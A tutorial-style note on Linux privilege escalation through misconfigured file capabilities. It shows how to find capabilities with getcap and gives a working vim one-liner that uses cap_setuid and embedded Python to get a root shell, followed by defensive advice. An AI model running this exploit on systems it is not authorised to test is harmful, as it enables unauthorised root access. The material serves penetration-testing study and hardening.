# Linux Privilege Escalation — Abusing Capabilities

## Overview

Linux **capabilities** split the privileges traditionally reserved for the root user into distinct, independent units. Instead of granting a binary full root access (as SUID does), an administrator can grant it just the specific privilege it needs — e.g., binding to low-numbered ports, raw socket access, or bypassing file permission checks.

This is intended as a more *granular* alternative to SUID. In practice, if a capability is misconfigured or overly permissive, it can be abused for privilege escalation — and because it's not the SUID bit, it's invisible to typical SUID-hunting enumeration (`find / -perm -4000`).

---

## Enumeration

List all files on the system with capabilities set:

```bash
getcap -r / 2>/dev/null
```

- `-r` — recursive search from the given path
- Redirecting `stderr` to `/dev/null` is standard practice, since an unprivileged user will get a large number of permission-denied errors while traversing the filesystem.

### Example output

```
/home/john/vim = cap_setuid+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

### Reading capability sets

Format: `capability_name+set`

Common sets:
| Flag | Meaning |
|------|---------|
| `e` | Effective — capability is active |
| `p` | Permitted — capability can be used |
| `i` | Inheritable — passed to child processes |

`cap_setuid+ep` = the `cap_setuid` capability is both **effective** and **permitted**, meaning the binary can call `setuid()` to change its UID (e.g., to `0`/root) immediately upon execution.

---

## Key Capability of Interest: `cap_setuid`

`cap_setuid` allows a process to change its UID to **any** UID, including `0` (root), without needing to already be root. If a binary with this capability can also execute arbitrary commands (like an interpreter or editor with scripting support), it becomes a direct path to root.

### Important note on detection

A binary can have capabilities set **without** the SUID bit being set on the file itself:

```bash
ls -l /home/john/vim
-rwxr-xr-x 1 root root 2906824 Jun 16 02:06 /home/john/vim
```

No `s` in the permission bits — this means:
- Standard SUID enumeration (`find / -perm -4000 -type f 2>/dev/null`) will **not** reveal this vector.
- `getcap -r /` must be run separately to catch capability-based privilege escalation paths.

---

## Reference: GTFOBins

[GTFOBins](https://gtfobins.org/#//^capabilities$) maintains a curated list of Unix binaries that can be exploited when specific capabilities (or SUID/sudo rights) are set on them. Always cross-reference discovered binaries + capabilities against this list.

---

## Exploitation Example: Vim with `cap_setuid`

Given:
```
/home/john/vim = cap_setuid+ep
```

Vim supports embedded Python execution (`:py3`), which can call OS-level functions — including `setuid()`.

### Exploit command

```bash
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

### Breakdown

1. `import os` — load Python's OS module inside Vim's embedded interpreter.
2. `os.setuid(0)` — elevate the process's effective UID to `0` (root). This works because the `vim` binary carries the `cap_setuid` capability.
3. `os.execl("/bin/sh", "sh", "-c", "reset; exec sh")` — replace the current process image with a shell, now running as root.
   - `reset` clears terminal artifacts from Vim.
   - `exec sh` replaces the shell process cleanly, giving an interactive root shell.

### Result

```bash
whoami
# john

# after running exploit:
id
# uid=0(root) gid=1000(john) groups=1000(john),4(adm),4(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
```

UID is `0` (root), though the group memberships remain as the original user — a normal artifact of `setuid()` without also modifying group IDs.

---

## Takeaways / Checklist

- [ ] Run `getcap -r / 2>/dev/null` during enumeration — don't rely solely on SUID checks.
- [ ] Cross-reference any binaries with capabilities against [GTFOBins](https://gtfobins.org).
- [ ] `cap_setuid` on an interpreter/editor with scripting (vim, python, perl, ruby, etc.) is a near-guaranteed root path.
- [ ] Other capabilities to watch for:
  - `cap_dac_override` / `cap_dac_read_search` — bypass file permission checks.
  - `cap_net_raw` — craft raw packets (less critical for privesc, but useful for network attacks).
  - `cap_sys_admin` — extremely broad, near-root-equivalent.
- [ ] As a defender: audit capabilities regularly, apply the principle of least privilege, and avoid granting powerful capabilities (`cap_setuid`, `cap_sys_admin`, `cap_dac_override`) to binaries that can execute arbitrary code.

---

## Defensive Notes

- Remove unnecessary capabilities: `setcap -r /path/to/binary`
- Audit capabilities as part of routine hardening reviews, not just SUID/SGID audits.
- Prefer fine-grained capabilities over SUID where possible, but validate that the specific binary cannot be abused to gain broader privileges than intended (check GTFOBins before granting).
